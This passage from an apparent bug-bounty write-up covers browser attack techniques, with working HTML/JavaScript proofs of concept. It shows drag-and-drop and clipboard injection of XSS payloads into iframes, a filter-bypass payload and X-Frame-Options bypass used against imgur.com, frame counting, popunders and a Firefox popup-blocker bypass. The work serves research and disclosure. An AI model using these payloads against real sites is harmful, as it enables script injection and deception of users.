class="attr">type</span>=<span class="string">text</span> <span class="attr">id</span>=<span class="string">inp</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">inp.<span class="property">onfocus</span>=<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    output.<span class="property">innerHTML</span>=inp.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>index.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://vulnerable/form.html&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;dragstart&quot;</span>,<span class="function">(<span class="params">event</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">  event.<span class="property">dataTransfer</span>.<span class="title function_">setData</span>(<span class="string">&quot;text&quot;</span>,<span class="string">&quot;&lt;img src=x onerror=alert(document.domain)&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><img src="https://i.imgur.com/i656ZpY.gif"></p>
<p>In the example above, the attacker’s page in the example above, the attacker’s page is from a different domain than the victim’s iframe. Such as an attacker and a host from which it would have functionality that reads content automatically, it does not necessarily need to read content automatically, however, but it isn’t a requirement as it is possible to do the same attack using two events (an ondrag and a click). However, I opted into showing the attack this way as it is more interesting.</p>
<p>The main idea here, of course, is to use the fact that the <code>iframe</code> is not isolated from these types of iteractions (like ondrag), so there is a possibility to drag content into an <code>iframe</code>. This technique has already helped me to get some <code>XSS</code> in some bug bounty programs.</p>
<h2 id="Chrome-amp-Firefox-Fourth-case"><a href="#Chrome-amp-Firefox-Fourth-case" class="headerlink" title="Chrome &amp; Firefox - Fourth case"></a>Chrome &amp; Firefox - Fourth case</h2><p>A few days before I finished this article I was thinking about how I could reproduce the clipboard technique within an iframe. In fact, there are no major complications, since we can generate the focus on an input within an <code>iframe</code> if this input has a valid id, otherwise, it becomes more difficult to focus without user interaction.</p>
<p><code>index.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">button</span> <span class="attr">onfocus</span>=<span class="string">&quot;testFocus()&quot;</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> <span class="title function_">testFocus</span>=(<span class="params"></span>)=&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">	location.<span class="property">href</span>=<span class="string">&quot;https://webhook.site/1d555163-68cd-4ccf-a260-b158747035c4#button&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<p><code>webhook.site</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">id</span>=<span class="string">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">result.<span class="property">innerHTML</span>=button.<span class="property">value</span></span></span><br><span class="line"><span class="language-javascript">&#125;,<span class="number">1000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">result</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Self-XSS-to-Good-XSS-in-imgur-com"><a href="#Self-XSS-to-Good-XSS-in-imgur-com" class="headerlink" title="Self-XSS to Good-XSS in imgur.com"></a>Self-XSS to Good-XSS in imgur.com</h1><p>Back in 2020, I did some research on imgur.com, found some <code>self-xss</code> but the scope of the program made it explicit that a <code>self-xss</code> without a good chain would not be considered a bug. So, I started to go deep into the application to understand it and maybe find some logic flaw that would allow me to turn this <code>self-xss</code> into <code>good-xss</code>.</p>
<h2 id="self-xss-in-Imgur"><a href="#self-xss-in-Imgur" class="headerlink" title="self-xss in Imgur"></a>self-xss in Imgur</h2><p>The filter is very basic, it just removes some keywords and some tags, so <code>&lt;&lt;script&gt; img src=x&gt;</code> after filtering it will be: <code>&lt;img src=x&gt;</code>, I ended up using src because I noticed that the filter was sanitizing the “on” events correctly, so I opted into using  <code>javascript:alert(1)</code>, however, the word <code>javascript</code> was also being filtered, especially in this context. Luckly, I realized that similarly to the case of <code>&lt;&lt;script&gt; img src=x&gt;</code>, if I separated the word into two parts and put <code>javascript</code> in the middle of the two parts, it would join them after being passed through the filter. Combining all this into a single payload meant we could execute XSS:</p>
<p><code>&lt;&lt;script&gt;iframe src=javajavascriptscript:alert(document.domain)&gt;</code></p>
<p><img src="https://i.imgur.com/RAq0zdY.gif"></p>
<h2 id="Bypass-XFO-Application-Context"><a href="#Bypass-XFO-Application-Context" class="headerlink" title="Bypass XFO (Application Context)"></a>Bypass XFO (Application Context)</h2><p>I found out that some endpoints allow an external website to place these endpoints in an iframe but with some limitations, since all <code>imgur.com</code> endpoints have <code>XFO</code> protection not allowing these pages to be placed in an iframe, however, it was a rule was noticed during the tests, a rule which only set the <code>XFO</code> header when the referrer was from another source or when there was no <code>referrer</code>. In another case, within the Imgur itself, it was noticed that in each user’s subdomains, <code>/all/</code> did not set <code>XFO</code>, however, the attack surface was smaller and more complex, so I chose to better debug the endpoints of the main domain. that accepted to be integrated into an iframe, one of those endpoints was <code>/a/IMAGE_ID/embed</code>.<br><code>/a/IMAGE_ID/embed</code> is a normal page to embed albums and photos on external websites, putting this endpoint in an iframe is expected, however, I added an <code>/embed</code> more in the URL, just to see what it would be her reaction, and surprisingly she opened the page of the actual post, inside the image and without any protection against <code>XFO</code>, so in the upper left corner it was possible to navigate to the upload page:</p>
<h2 id="Frame-Counting"><a href="#Frame-Counting" class="headerlink" title="Frame Counting"></a>Frame Counting</h2><p>With the <code>XFO</code> bypass, I started to model the proof of concept idea, and I came to the conclusion that I would need at least 3 user interactions to get the <code>XSS</code>, the first one would be the user’s click on the upload button, the second, the upload of a photo and the third the <code>XSS</code> paste. Only with the <code>XFO</code> bypass this was already possible, but I didn’t feel it was enough as the attack wouldn’t be very convincing, and it would be hard to get users to perform these actions, so I decided to model a more sophisticated attack for this. I looked through all the possibilities I could think off to make the actions required imperceptible, and I thought of one - however I would need to use frame counting to pull it off.</p>
<p>During the tests, I noticed that there is a big difference in the number of iframes on some pages, especially on the <code>upload?</code>  in relation to the others. On other pages, we usually have more than 3 frames, while on the <code>upload?</code> page we only have 1 frame - this information is very good for the construction of this a, because having the idea of the number of frames that the target page has in relation to the others is an helps a lot when trying to detect navigations within an iframe. When we are creating an iframe of <code>/a/IMAGE_ID/embed/embed</code> we can know that it will have more than one iframe, and that when a navigation to <code>upload?</code> happens, there will be only one iframe. With this information it is now possible to know which page the user is on.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">ifr</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">ifr.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(ifr.<span class="property">contentWindow</span>.<span class="property">frames</span>.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>It would be possible to do the same type of detection if we found another type of <code>XSLeak</code> on the page, for example, if on the upload page there was a <code>postMessage</code> being sent outside the domain, from which our page could listen, it would also be possible to detect the moment when the iframe navigated to the upload page.</p>
<h2 id="ondrag-here-too"><a href="#ondrag-here-too" class="headerlink" title="ondrag here too"></a>ondrag here too</h2><p>Ondrag has 3 very important functions: <code>ondragstart</code>, <code>ondragend</code>, and the content inside the <code>dataTransfer</code>. Dragging the image into the iframe is mandatory for the vulnerability to work, so mandatorily the start of the ondrag is the movement of dragging the image into the <code>iframe</code>, and the moment the image is released a new message will appear for the user.</p>
<h2 id="Clipboard-Trick"><a href="#Clipboard-Trick" class="headerlink" title="Clipboard Trick"></a>Clipboard Trick</h2><p>I used <code>navigator.clipboard.writeText()</code> to write to the victim’s clipboard, where the victim’s clipboard content is now the XSS payload.<br>Putting all these parts together, it was possible to create an iterative PoC. Without counting the number of frames, I don’t think this attack would be possible to be performed, and if there was no way to interact with the <code>iframe</code> in Firefox this attack would be even more difficult to be carried out (if not impossible).</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/zHOchXsiJoo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>


<p><a target="_blank" rel="noopener" href="https://gist.github.com/keerok/870ea0733c47c9cfb36a854018fc0e75">full code of the PoC</a></p>
<hr>
<h2 id="PopUnders"><a href="#PopUnders" class="headerlink" title="PopUnders"></a>PopUnders</h2><p>As previously introduced, popunders can be used to successfully hide attacks, or simply to hide a page. For a while, I tried to think of something else that would be possible to do with a popunder, maybe some new attack technique, however, in all the techniques that I thought a 0day in the browser was needed (either to change the focus between windows or to somehow be able to make newly created windows interact with another main window). Taking this second option into account, it is possible to use it in some types of attacks, but these types of attacks are very limited and often without impact if the main window does not automatically execute a task. In any case, it would be necessary to use SOME for these types of attacks.</p>
<p>I don’t have a tactic or a list of testing tasks while looking for popunders, the biggest search technique that works for me is to really understand how events and the browser ecosystem work. Popunders sometimes happen in combinations that make sense (from a logical perspective), not always. Mandatorily, to get a popunder it is necessary to find an event that creates a focus on the window that initiates the behavior, this effect has already been done in several ways but I will show only two authoring methods.</p>
<p>This first method works both on Chrome and Firefox, the behavior that generates the popunder is due to the download <code>attachment</code> in combination with <code>onbeforeunload</code> and automatic navigation. When the download attachment is triggered, a download alert will be triggered in the browser, asking if you really want to save this file, then the <code>location</code> will try to navigate to <code>google.com</code> but <code>onbeforeunload</code> ends up locking this navigation, creating another alert in the browser that asks if the user really wants to leave. This combination of events ends up taking the focus off the new window that was opened.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">1 <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">2    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">3    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">4    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">5        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onselect</span>=<span class="string">&quot;bug()&quot;</span> <span class="attr">oncopy</span>=<span class="string">&quot;bug()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test me&quot;</span>&gt;</span></span><br><span class="line">6        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">7            const bug = () =&gt;&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">8                setTimeout(()=&gt;&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">9                    window.open(&#x27;http://evil.com/&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">10                    document.write(`<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">http://localhost/download_attach.php</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">11                    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars"><span class="number">12</span>                    onbeforeunload=<span class="function">()=&gt;</span>&#123;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars"><span class="number">13</span>                        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars"><span class="number">14</span>                    &#125;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars"><span class="number">15</span>                    location=<span class="string">&#x27;//google.com&#x27;</span></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars"><span class="number">16</span>                    &lt;\/script&gt;<span class="string">`)</span></span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">17                &#125;,50)</span></span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">18            &#125;</span></span></span></span></span><br><span class="line"><span class="string"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">19        </span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">20    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">21 <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<ul>
<li>line 9: a <code>window.open</code> is opened</li>
<li>line 10: right after the window is called, a document.write writes an iframe with the src referencing <code>download_attach.php</code>, which contains a <code>content-attachment</code>, that is, a random file to be downloaded</li>
<li>line 12: <code>onbeforeunload</code> is set with <code>return &#39;&#39;</code>. In this case, I use <code>onbeforeunload</code> to lock the automatic navigation.</li>
<li>line 15: a <code>location</code> redirecting to <code>google.com</code>, from which the redirect will be blocked due to <code>onbeforeunload</code></li>
</ul>
<p>This was the first popunder that I encountered:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">requestFullScreen</span>(<span class="params">element</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> requestMethod = element.<span class="property">requestFullScreen</span> || element.<span class="property">webkitRequestFullScreen</span> || element.<span class="property">mozRequestFullScreen</span> || element.<span class="property">msRequestFullScreen</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (requestMethod) &#123;</span></span><br><span class="line"><span class="language-javascript">        requestMethod.<span class="title function_">call</span>(element);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">onkeypress=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> elem = <span class="variable language_">document</span>.<span class="property">body</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">requestFullScreen</span>(elem);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;//example.com&#x27;</span>,<span class="string">&#x27;_blank&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>In some cases, the popunder can be very useful for when the vulnerable page is very heavy or takes more time than usual to load. Just for the sake of demonstration, below is a representation of what a chain between popunder and the use of the clipboard would be like when improving a <code>self-xss</code>:</p>
<p><code>popunder-oncopy.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onselect</span>=<span class="string">&quot;bug()&quot;</span> <span class="attr">oncopy</span>=<span class="string">&quot;bug()&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test me&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	  <span class="keyword">var</span> w;</span></span><br><span class="line"><span class="language-javascript">          <span class="keyword">const</span> <span class="title function_">bug</span> = (<span class="params"></span>) =&gt;&#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    w = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://localhost:81/form.html&#x27;</span>,<span class="string">&#x27;_blank&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`&lt;iframe src=http://localhost:81/download_attach.php&gt;&lt;/iframe&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    onbeforeunload=()=&gt;&#123;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                        return &#x27;&#x27;;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &#125;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    location=&#x27;//google.com&#x27;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">                    &lt;\/script&gt;`</span>)</span></span><br><span class="line"><span class="language-javascript">                &#125;,<span class="number">50</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	    <span class="title function_">bug</span>();</span></span><br><span class="line"><span class="language-javascript">	    onkeypress=<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">		w.<span class="title function_">focus</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                navigator.<span class="property">clipboard</span>.<span class="title function_">writeText</span>(<span class="string">&#x27;&lt;img src=x onerror=alert(1)&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;,<span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.imgur.com/GhfQDnk.gif"></p>
<hr>
<h2 id="Bypass-PopUp-Blocking"><a href="#Bypass-PopUp-Blocking" class="headerlink" title="Bypass PopUp Blocking"></a>Bypass PopUp Blocking</h2><p>During the process of discovering this bug, the real intention was not even to find a <code>popup blocking</code> bypass, but I ended up finding one, along with that, I came across the lack of such reports. In this section, I will explain about a <code>popup blocking</code> bypass that I found about 7 months ago. This bypass depends on a user click. In browsers we can have two types of clicks:</p>
<ul>
<li>real click:</li>
<li>Synthetic click event:</li>
</ul>
<p>The main part of the bug is the click in general, as it seems that Firefox fails to understand what is a user click and what is a <code>Synthetic click</code> event. Still, to create this confusion in Firefox it is necessary for the user to initially click on a malicious page, so we are able to trigger the <code>Synthetic click</code> automatically, making firefox understand that the Synthetic click is a user click.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">1 <span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line">2 <span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">dir</span>=<span class="string">&quot;ltr&quot;</span>&gt;</span></span><br><span class="line">3  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">4    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">5    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Bypass popup Blocking<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">6  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">7  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">8    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">id</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span> check me <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">9    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>Click me to spawn a lot of popups<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">10      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="number">11</span></span></span><br><span class="line"><span class="language-javascript"><span class="number">12</span>        onclick=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">13</span>          <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">14</span>            <span class="variable language_">window</span>.<span class="title function_">open</span>(location.<span class="property">href</span>,<span class="string">&quot;_blank&quot;</span>,<span class="string">&quot;toolbar=yes,scrollbars=yes,resizable=yes,top=500,left=500,width=400,height=400&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="number">15</span>          &#125;, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">16</span>        &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="number">17</span></span></span><br><span class="line"><span class="language-javascript"><span class="number">18</span>        <span class="keyword">function</span> <span class="title function_">simulateClick</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">19</span>          <span class="keyword">var</span> evt = <span class="keyword">new</span> <span class="title class_">MouseEvent</span>(<span class="string">&quot;click&quot;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">20</span>            <span class="attr">bubbles</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="number">21</span>          &#125;);</span></span><br><span class="line"><span class="language-javascript"><span class="number">22</span>          <span class="keyword">var</span> cb = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;checkbox&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="number">23</span>          cb.<span class="title function_">dispatchEvent</span>(evt);</span></span><br><span class="line"><span class="language-javascript"><span class="number">24</span>        &#125;</span></span><br><span class="line"><span class="language-javascript"><span class="number">25</span></span></span><br><span class="line"><span class="language-javascript"><span class="number">26</span>				<span class="comment">// Spawn an arbitrary number of popups this way</span></span></span><br><span class="line"><span class="language-javascript"><span class="number">27</span>		<span class="keyword">var</span> num_popups = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="number">28</span>		    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; num_popups; i++) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="number">29</span>              <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;button&quot;</span>).<span class="title 